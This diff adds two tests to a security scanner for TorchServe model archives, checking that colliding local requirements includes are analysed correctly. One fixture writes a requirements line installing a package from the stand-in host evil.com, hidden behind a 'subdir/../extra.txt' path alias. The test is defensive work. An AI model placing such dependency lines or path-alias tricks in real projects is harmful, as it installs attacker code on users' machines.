@@ -1116,6 +1116,53 @@ def test_scan_analyzes_local_included_requirements_files(tmp_path: Path) -> None
     )
 
 
+def test_scan_flags_colliding_local_requirements_include_even_when_benign_alias_is_last(tmp_path: Path) -> None:
+    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
+    mar_path = _create_mar_archive(
+        tmp_path,
+        manifest=manifest,
+        entries=[
+            ("handler.py", b"def handle(data, context):\n    return {'ok': True}\n"),
+            ("weights.bin", b"weights"),
+            ("requirements.txt", b"-r extra.txt\n"),
+            ("extra.txt", b"git+https://evil.com/repo#egg=evilpkg\n"),
+            ("subdir/../extra.txt", b"numpy==1.26.4\n"),
+        ],
+        filename="requirements_local_include_collision_override.mar",
+    )
+
+    result = TorchServeMarScanner().scan(str(mar_path))
+    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")
+
+    assert len(requirements_failures) == 1
+    assert any(
+        finding["reason"] == "git_install" and finding["requirements_file"] == "extra.txt"
+        for finding in requirements_failures[0].details.get("findings", [])
+    )
+
+
+def test_scan_accepts_clean_colliding_local_requirements_include_aliases(tmp_path: Path) -> None:
+    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
+    mar_path = _create_mar_archive(
+        tmp_path,
+        manifest=manifest,
+        entries=[
+            ("handler.py", b"def handle(data, context):\n    return {'ok': True}\n"),
+            ("weights.bin", b"weights"),
+            ("requirements.txt", b"-r extra.txt\n"),
+            ("extra.txt", b"numpy==1.26.4\n"),
+            ("subdir/../extra.txt", b"torch==2.2.2\n"),
+        ],
+        filename="requirements_local_include_collision_clean.mar",
+    )
+
+    result = TorchServeMarScanner().scan(str(mar_path))
+    requirements_checks = _checks_named(result, "TorchServe Requirements Supply Chain Analysis")
+
+    assert len(requirements_checks) == 1
+    assert requirements_checks[0].status == CheckStatus.PASSED
+
+
 @pytest.mark.parametrize(
     ("requirements_line", "filename"),
     [
